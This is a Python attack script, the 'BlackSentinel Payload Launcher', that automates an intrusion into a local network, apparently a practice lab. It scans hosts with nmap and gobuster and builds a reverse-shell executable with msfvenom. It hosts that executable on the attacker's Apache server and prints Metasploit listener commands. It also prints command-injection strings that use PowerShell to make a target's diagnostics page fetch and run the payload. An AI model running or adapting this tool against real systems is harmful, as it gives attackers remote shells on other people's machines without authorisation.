import os
import subprocess

my_ip = "192.168.50.102"

ignore_list = [
    '192.168.50.1', '192.168.50.6', '192.168.50.37', '192.168.50.58',
    '192.168.50.70', '192.168.50.78', '192.168.50.100', '192.168.50.109',
    '192.168.50.164', '192.168.50.181', '192.168.50.184', '192.168.50.240',
    '192.168.50.241', '192.168.50.9', '192.168.50.144', '192.168.50.155',
    '192.168.50.149', '192.168.50.234', '192.168.50.182', '192.168.50.32', '192.168.50.79',
    my_ip
]

print("\n[+] Welcome to BlackSentinel Payload Launcher 🧠💀")
input("[!] Press Enter to begin...")

subnet_range = input("Enter subnet range (default /24): ").strip() or "/24"
target_os = input("What OS are you targeting? (windows/linux): ").strip().lower()

print("\n[+] Scanning local network...")
scan = subprocess.run(["sudo", "nmap", "-sn", f"192.168.50.0{subnet_range}"],
                      capture_output=True, text=True)

ip_list = [line.split()[-1].strip("()")
           for line in scan.stdout.splitlines()
           if "Nmap scan report for" in line]

cleaned_list = [ip for ip in ip_list if ip not in ignore_list]
print("\n[+] Filtered IPs found on network:", cleaned_list)

windows_hosts = {}
for ip in cleaned_list:
    print(f"\n[+] Scanning services on: {ip}")
    scan = subprocess.run(["sudo", "nmap", "-sV", ip], capture_output=True, text=True)
    if target_os in scan.stdout:
        windows_hosts[ip] = scan.stdout

for ip, result in windows_hosts.items():
    print(f"\n[+] {ip} identified as a {target_os} host\n{result}")

hf_ip = input("\n[?] Enter the IP address of the H&F host (port 80 open): ").strip()

print("\nSelect attack method:")
print("[1] HTTP")
print("[2] HTTPS")
print("[3] FTP")
print("[4] SMB")
method_choice = input("Enter your choice: ").strip()
methods = {"1": "http", "2": "https", "3": "ftp", "4": "smb"}
attack_method = methods.get(method_choice, "http")

if attack_method in ["http", "https"]:
    run_gobuster = input("Run Gobuster to look for hidden files? (y/n): ").lower()
    if run_gobuster == "y":
        subprocess.run([
            "gobuster", "dir",
            "-u", f"{attack_method}://{hf_ip}/",
            "-w", "/usr/share/wordlists/dirb/common.txt"
        ])

route = "diagnostics.php?auth=admin123"
print(f"\n[+] Launching Diagnostics page in Firefox at {attack_method}://{hf_ip}/{route} ...")
subprocess.run(["firefox", f"{attack_method}://{hf_ip}/{route}"],
               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

use_existing = input("\nUse existing payload? (y/n): ").lower()

if use_existing == "y":
    payload_path = input("Enter full path to payload: ")
    payload_name = os.path.basename(payload_path)
    subprocess.run(["cp", payload_path, "/var/www/html/"], check=True)
else:
    payload_name = input("Payload name (e.g. reverse.exe): ")
    lport = input("LPORT to listen on (e.g. 4444): ")
    protocol = input("Payload protocol (e.g. windows/shell_reverse_tcp): ")

    print("\n[+] Generating payload with msfvenom...")
    subprocess.run([
        "msfvenom",
        "-p", protocol,
        f"LHOST={my_ip}",
        f"LPORT={lport}",
        "-f", "exe",
        "-o", payload_name
    ], check=True)
    subprocess.run(["sudo", "mv", payload_name, "/var/www/html/"], check=True)

print("\n[+] Starting Apache...")
subprocess.run(["sudo", "service", "apache2", "start"], check=True)

print(f"\n[+] Payload hosted at: http://{my_ip}/{payload_name}")
print("[!] Start Metasploit handler with the following:")
print("msfconsole")
print("use exploit/multi/handler")
print(f"set payload {protocol}")
print(f"set LHOST {my_ip}")
print(f"set LPORT {lport}")
print("exploit")

input("\n[!] Press Enter once handler is running...")

print("\n[+] Inject the following into Diagnostics page:")
print(f"1. Download payload:")
print(f"127.0.0.1 & powershell -Command \"Invoke-WebRequest -Uri http://{my_ip}/{payload_name} -OutFile C:\\xampp\\htdocs\\{payload_name}\"")
print("\n2. Execute payload:")
print(f"127.0.0.1 & C:\\xampp\\htdocs\\{payload_name}")
